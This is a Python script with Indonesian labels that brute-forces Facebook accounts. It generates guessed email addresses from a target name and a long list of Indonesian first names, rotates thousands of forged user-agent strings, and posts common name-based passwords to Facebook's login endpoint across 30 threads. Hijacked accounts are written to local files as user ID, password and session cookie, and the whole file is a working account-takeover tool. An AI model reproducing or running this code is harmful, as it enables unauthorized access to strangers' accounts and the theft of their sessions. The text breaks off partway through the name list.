import os, re, bs4, sys, json, rich, time, random, datetime, requests; from time import sleep, strftime; from rich.console import Console; from rich.panel import Panel; from random import choice as rc; from random import randint as rr; from random import randrange as rg; from concurrent.futures import ThreadPoolExecutor; now = datetime.datetime.now(); dta = {'1':'Jan','2':'Feb','3':'Mar','4':'Apr','5':'Mei','6':'Jun','7':'Jul','8':'Agu','9':'Sepr','10':'Okt','11':'Nov','12':'Des'}; tgl = now.day; bln = dta[(str(now.month))]; thn = now.year; okc = ('OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); cpc = ('CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); ok,cp,loop,id,id2,idf,P,M,K,B,H,N,bsp,ses = 0,0,0,[],[],[],'\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[0m',bs4.BeautifulSoup,requests.Session()

def Main_Menu():
	NiawMXV(); nama = Console().input(' > nama target: '); dump = Console().input(" > total clone: "); CC   = 0
	for xv in range(int(dump)):
		AA = nama; BB = Inisial(); CC+=1; cc = str(rr(0,999)); DD = rc(['',f'@{rc(["exdonuts","yahoo","hotmail","gmail"])}.com']); EE = rc([f'{AA}{rc(["",".",""])}{BB}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{BB}{rc(["",".",""])}{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{BB}{DD}',f'{BB}{rc(["",".",""])}{AA}{DD}']); FF = f'{EE}|{nama}'
		if FF in id: pass
		else: id.append(FF)
		print(f" > terkumpul {len(id)} email",end=("\r")); sleep(0.0007)
	Eksekusi()
ugen2=[]
ugen=[]
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(92,115)
	e='0'
	f=random.randrange(4200,6000)
	g=random.randrange(62,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=random.choice(['SM-A205U','SM-A102U','SM-G960U','SM-N960U','LM-Q720','LM-X420','LM-Q710(FGN)'])
	d=') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(92,115)
	x='0'
	f=random.randrange(4200,6000)
	g=random.randrange(62,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}; {c}{d}{e}.{x}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4','5','6','7','8','9','10','11'])
	c='MiTV-AESP0 Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(62,115)
	e='0'
	f=random.randrange(3200,5900)
	g=random.randrange(92,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4','5','6','7','8','9','10','11'])
	x='0'
	c='ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(62,115)
	e='0'
	f=random.randrange(3200,5900)
	g=random.randrange(92,199)
	h='Mobile Safari/537.36'
	lol=f'{a} {b}.{x}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14'])
    c='RMX3371 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14'])
    c='ASUS_I005DA Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14'])
    c='Pixel 6 ua Build/UPB3.230519.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='SM-G960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='V2171A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='REVVL V+ 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='CPH2451 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['9','10','11','12','13'])
    c='zh-CN; PEPM00 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(40,150)
    h='UCBrowser/15.5.1.1241 Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='TRT-L53 Build/HUAWEITRT-L53; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(70,115)
    e='0'
    f=random.randrange(3200,5000)
    g=random.randrange(62,192)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Windows NT'
    b=random.choice(['9','10','11','12','13'])
    t='0'
    c='Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(40,150)
    h='Safari/537.36'
    lol=f'{a} {b}.{t}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='T Phone ua Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,6000)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='T Phone Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,6000)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['9','10','11','12','13'])
    c='fa-ir; Redmi Note 11S Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(82,115)
    e='0'
    f=random.randrange(4200,4900)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='Redmi Note 11 ua (4G) Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,4900)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14','15'])
    c='SM-S908'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e='Build/'
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='P1A.210812.'
    h=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
    i='; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    j=random.randrange(92,115)
    k='0'
    l=random.randrange(4200,6000)
    m=random.randrange(62,192)
    n='Mobile Safari/537.36 OPR/11.1.2254.67011'
    lol=f'{a} {b}; {c}{d} {e}{f}{g}{h}{i}{j}.{k}.{l}.{m} {n}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0'
    b=random.choice(['iPod touch','iphone',''])
    c='CPU iPhone OS'
    d=random.choice(['11','12','13','14','15','16','17','18','19'])
    e='_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
    f=random.choice(['FxiOS','EdgiOS','Mobile','CriOS','GSA'])
    g=random.randrange(92,600)
    h='0'
    i=random.randrange(4200,6000)
    j=random.randrange(62,192)
    k=random.choice(['Mobile','Version','Safari Line','MobileIron'])
    l=random.choice(['15E148 Safari/604.1','Safari/605.1.15'])
    lol=f'{a} {b}; {c} {d} {e} {f}/{g}.{h}.{i}.{j} {k}/{l}'
    ugen.append(lol)
for tanim in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['10','11','12','13'])
    c=random.choice(['REVVL V+ 5G','T Phone ua','REVVL 2 PLUS','TMRVL4G','T Phone','REVVL 2','REVVL 2 PLUS','REVVL V+ 5G'])
    d='Build/'
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f='P1A.'
    g=random.randrange(200720,210812)
    h=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
    i='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    j=random.randrange(92,115)
    k='0'
    l=random.randrange(5005,6000)
    m=random.randrange(92,192)
    n='Mobile Safari/537.36'
    lol=f'{a} {b}; {c} {d}{e}{f}{g}.{h}; {i}{j}.{k}.{l}.{m} {n}'
    ugen.append(lol)
for TANIM in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='uafile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for TANIM in range(1000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='uafile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='uafile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku) 

    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='vivo 1904 Build/RP1A.200720.012; wv)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
def Eksekusi():
	for x in id: id2.append(x)
	NiawMXV(); Console(width=50).print(Panel(f"[underline][bold #FF00D4]* [bold #FFFFFF]crack [bold #00FF00]{len(id)}[bold #FFFFFF] email[bold #FF00D4] *[/underline]",style="bold purple",width=50),justify="center"); print()
	with ThreadPoolExecutor(max_workers=30) as MethodCrack:
		for uids in id2:
			user = uids.split('|')[0]; nmfl = uids.split('|')[1].lower(); nama = nmfl.split(' ')[0]; pasw = ['kata sandi',nama,nama+'12',nama+'123',nama+'1234',nama+'12345',nama+'123456',nama+'321',nama+'99',nama+'00',nama+'01',nama+'02',nama+'03',nama+'04',nama+'05',nama+'06',nama+'07',nama+'08',nama+'09',nama+'10',nama+'11',nama+'21',nama+'22',nama+'23',nama+' '+nama]
			MethodCrack.submit(Async,user,pasw,nmfl)
	print('\n'); Console().print(f'[bold #FFFFFF] > crack [bold #00FF00]{len(id)}[bold #FFFFFF] email selesai | akun ok:[bold #00FF00]{ok} [bold #FFFFFF]akun cp:[bold #FFFF00]{cp}'); exit()

def Async(user, pasw, nmfl):
	ses = requests.Session()
	rc = random.choice
	rr = random.randint
	usr = user.split('@')[0]
	global loop,ok,cp
	print(f"{H} 𝘾𝙧𝙖𝙘𝙠 {M}({loop}{M}){N}-{H}{ok}{N}:{K}{cp}{N}>{H}@{K}{usr}          {N}", end = ("\r"))
	ua = random.choice(ugen)
	for pw in pasw:
		try:
			requ = ses.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
			kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in ses.cookies.get_dict().items() ])}')
			data = {
				'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
				'li':re.search('name="li" value="(.*?)"',str(requ)).group(1),
				'try_number':'0',
				'unrecognized_tries':'0',
				'email':f'{user}',
				'prefill_contact_point':f'{user}',
				'prefill_source':'browser_dropdown',
				'prefill_type':'password',
				'first_prefill_source':'browser_dropdown',
				'first_prefill_type':'contact_point',
				'had_cp_prefilled':'true',
				'had_password_prefilled':'true',
				'is_smart_lock':'false',
				'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requ)).group(1),
				'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
				'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requ)).group(1),
				'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
				'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'__dyn':'',
				'__csr':'',
				'__req':rc(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
				'__fmt':'1',
				'__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
				'__user':'0'
			}
			head = {
				'Host': 'x.prod.facebook.com',
				'content-length': f'{len(str(data))}',
				'sec-ch-ua': '"Android WebView";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
				'sec-ch-ua-mobile': '?0',
				'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
				'x-response-format': 'JSONStream',
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'sec-ch-ua-platform-version': '""',
				'x-requested-with': 'XMLHttpRequest',
				'x-asbd-id': '129477',
				'sec-ch-ua-full-version-list': '"Android WebView";v="125.0.6422.53", "Chromium";v="125.0.6422.53", "Not.A/Brand";v="24.0.0.0"',
				'sec-ch-ua-model': '""',
				'sec-ch-prefers-color-scheme': 'dark',
				'sec-ch-ua-platform': '"Linux"',
				'accept': '*/*',
				'origin': 'https://x.prod.facebook.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
				'accept-encoding': 'gzip, deflate, br, zstd',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'priority': 'u=1, i'
			}
			resp = ses.post(
				'https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
				cookies = {'cookie': kueh}, data = data, headers = head, allow_redirects = False
			)
			if "c_user" in ses.cookies.get_dict():
				kue = ';'.join([x+'='+v for x,v in ses.cookies.get_dict().items()])
				uid = re.findall('c_user=(.*);xs',kue)[0]
				if uid in idf or user in idf:
					break
				idf.append(uid)
				ok+=1
				print(f" > {H}{uid}|{pw}|{kue}{N}")
				open('Okeh/'+okc,'a').write(f'{uid}|{pw}|{kue}\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				try: uid = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				except: uid = user
				if uid in idf:
					break
				idf.append(uid)
				cp+=1
				print(f" > {K}{uid}|{pw}               {N}")
				open('Cepe/'+cpc,'a').write(f'{uid}|{pw}\n')
				break
			else: continue
		except (requests.exceptions.ConnectionError): sleep(15)
	loop +=1

def NiawMXV(): os.system('clear'); Console().print("""[bold #FF00D4]            L.                                   \n            EW:        ,ft                       \n            E##;       t#E                       \n :KW,      LE###t      t#E :KW,      L:KW,      L\n  ,#W:   ,KGE#fE#f     t#E  ,#W:   ,KG ,#W:   ,KG\n   ;#W. jWi E#t D#G    t#E   ;#W. jWi   ;#W. jWi \n    i#KED.  E#t  f#E.  t#E    i#KED.     i#KED.  \n     L#W.   E#t   t#K: t#E     L#W.       L#W.   \n   .GKj#K.  E#t    ;#W,t#E   .GKj#K.    .GKj#K.  \n  iWf  i#K. E#t     :K#D#E  iWf  i#K.  iWf  i#K. \n LK:    t#E E#t      .E##E LK:    t#E LK:    t#E \n i       tDj..         G#E i       tDji       tDj\n                        fE                       \n                         ,                       """)

def Inisial(): return rc(['aca','acha','ai','aii','adawiah','adawiyah','ade','adell','adel','adellaa','adelia','adellia','adeliya','adiba','adifa','adinda','aeni','aidah','aini','ainun','aira','asiah','aisah','aisyah','afifah','afipah','alawiah','alawiyah','ajahra','ajeng','ajeung','ajig','ajijah','ajizah','alesha','alia','alika','alimah','aliya','alifa','alifah','aliva','alivah','aliyah','almeera','almira','ama','amalia','amaliah','amaliyah','amanda','amidah','amira','aminah','ana','anantasia','anantasya','anastasia','anastasya','andini','ani','anisa','anita','any','anying','anyun','anggraeni','anggraini','anggi','anggita','anggun','anugerah','anugrah','anjing','apifah','apipah','april','aprilia','aprillia','apriliani','apriliyani','aprilianti','apriliyanti','aqila','aqilla','ara','arra','arafah','arrafah','areta','aretha','arofah','arin','arini','ariani','arista','ariyani','aryani','aryanti','arianti','ariyanti','arumi','arsita','arsyita','arsila','asyila','asypa','asifa','asipa','asmi','asmara','asih','asilah','asti','astiani','astiyani','astuti','atik','atika','atikah','ayg','ayank','ayang','ayra','ayu','ayyu','ayunda','ayuni','ayudia','ayudiya','ayudiah','ayuningsih','azzahra','azijah','azizah','azmi','azmy','azura','babi','baby','badriah','bajingan','bagong','bangsat','bela','bella','bibah','bila','billa','bintang','bulan','bunga','bungsu''cabi','cabhy','caby','cabby','caca','cca','cahaya','cahya','cahyani','camelia','cangcut','cans','canss','cantik','cantika','celsi','celsie','centil','chaca','chacha','chelsi','chelsie','chelsea','chika','cia','cci','cici','cika','cimok','cindy','cinta','cintia','cintaku','cintya','cintiya','citra','chindy','cucu','ccu','culun','cupu','cynthia','cyntia','dafina','dahlia','dania','daniah','daniyah','danyyah','daswita','dara','davina','dea','dede','dela','della','delia','delicia','denia','deniah','deniyah','deon','debi','deby','debby','denita','denisa','devi','devia','devie','desnia','desnie','divita','desi','desita','deswita','dwi','dewi','dewita','dhe','dhea','dheniah','dhewi','dhita','dhiya','dia','diah','diajeng','dian','diana','diandra','diannova','dias','dika','diksa','dila','dilla','dipa','diva','dianda','dila','dilla','dira','dina','dinda','dini','diniah','diniyah','disa','disha','dita','diya','diyah','dona','dyra','dyah','eka','eira','elfi','elia','eliana','elin','elina','elisabeth','elis','ellis','elise','eliya','eliza','elizabeth','ella','elma','elmira','elisa','elisha','elisia','elisiya','elisya','elisyha','elfina','elsa','evi','epi','elin','elsy','elva','elvira','elly' 'elvina','emi','emilia','emy','emyliya','ema','emma','endah','endang','erna','erni','erika','erlinda','esti','estiana','eis','eti','etie','ety','euis','eva','evita','evitamala','evalina','ewe','farah','farrah','fadila','fadla','fadhila','fadhla','faija','faiza','faizza','faizah','fani','fanni','fany','fanny','fanya','farida','faridha','fatin','fatim','faujia','faujiah','fauzia','fauziah','fauziya','fauzyah','fawziyah','fazila','fazilla','fazeela','fatima','fatimah','fathimah','felisia','felisya','ferli','ferly','fika','fina','fiona','fionna','fida','fira','firli','firly','fitri','fitriani','fitriyani','fitryani','frisilia','frisiliya','freya','friska','fuji','fuzi','gaby','gabby','gadis','geby','gebby','gelsey','gendis','gemoy','gea','ghea','gia','ghia','ghina','ghita','gina','ginna','gisela','gisella','gita','gitta','greta','gresik','giska','ganesha','geisha','habibah','hafsa','halima','halia','halimah','hafiza','hafsah','hafiza','hafizah','hana','handayani','handayanti','hanna','hannah','hani','hany','hanny','hanifah','hanipah','hania','haniya','hartini','hasanah','hatima','hatimah','hilda','hilma','hilmawati','hemalia','hepti','hesa','hessa','hesha','hesti','hestia','hesty','helga','hasna','hopi','hopipah','hoho','hotima','hotimah','hikmah','humaida','humayda','husna','hurairah','ica','icaa','icha','ichaa','ifa','iffa','ilmira','ina','inna','inaara','inara','inarah','inayah','indah','indira','indyra','indri','indry','insan','insani','imelda','ina','irma','irena','ika','ijah','intan','intanrahayu','ira','isabela','isabella','isan','isana','isyana','isah','isma','ismawati','ismawaty','ismi','isnaeni','iza','izah','jafira','jahira','jalilah','jahra','jamilah','jannah','jasmin','jayanti','jelita','jeni','jeny','jenita','jesica','jesika','jihan','jihana','jingga','juwita','juli','julia','juliana','juliet','jumaina','jumainah','juniarti','junaina','juwitta','jwita','kaila','kalia','kaira','khaira','karin','karina','kartika','kadek','kania','kaniya','kartini','kasih','kamala','kamila','karomah','karisa','karsih','katrina','keira','khaira','khaila','khafifah','khadijah','khairun','khairunisa','khalifah','khatimah','khopipah','kiki','kim','kila','kira','kirani','komarudin','kumala','kumalasari','kokom','komala','komalasari','kontol','kotima','kotimah','kulsum','kultsum','kuntul','kurnia','kurniati','kurniyati','kursina','kurniasih','kusmiati','kusmiyai','laela','lala','laila','lati','laty','latifah','lathifah','layla','laras','larasati','lasmini','laura','laudia','laudya','lela','lesmana','lena','leni','leny','lestari','lestary','lesti','lesty','levita','lia','lida','lidia','lidya','liana','liani','lilis','lina','linda','lintang','lis','lisa','lisha','lisna','lisnawati','lisnawaty','listi','listy','listia','listya','liza','liya','liyani','liza','lomrah','lulu','luna','lusi','lusy','luvita','lyna','lysa','mae','maemunah','maesarah','maesaroh','mala','maida','maidah','maira','maisa','maisha','malika','maimunah','magfirah','mahalini','maharani','maharini','mahda','mahmud','manda','mandha','maria','mardiah','mardianti','mardiyanti','mardyah','mardiyah','mariah','mariam','mariyah','maryati','mariati','mariyati','markonah','mariyam','marisa','marissa','martina','martinah','martini','maryamah','marwah','maryanti','marwati', 'marwaty','marzia','marziya','masitoh','masriah','masriyah','maulida','maulidia','maulidya','maulidiya','mawar','maya','mayra','maymuna','maymunah','marziah','meca','mecca','meka','mega','melani','melany','meli','melinda','melisa','melly','memek','mia','mila','mimin','mira','mirna','miranda','miya','mufliha','munaroh','munawarah','munawaroh','murni','murniati','murniyati','muslima','mulimah','muti','mutmainah','muthmainnah','mutmaidah','muthmaidah','mutia','mutiara','nabila','nada','nadhin','nadia','nadira','nadhira','nadin','nadiya','nafisa','nafisha','nafisah','nagita','naila','naira','najwa','nana','nanda','nani','natalia','nataliya','natasia','natasya','natasyha','naura','nayara','nayla','naswa','nashwa','nazwa','nia','nida','nifa','nina','nindi','nindy','ningrum','ningsih','nita','nitatalia','niken','nisa','nissa','nurul','nopi','novi','novita','nurull','nunung','nuri','nurianti','nurjanah','nuryanti','oca','octa','octavia','olivia','okta','oktavia','ocha','padma','putri','puspa','pipit','paramita' 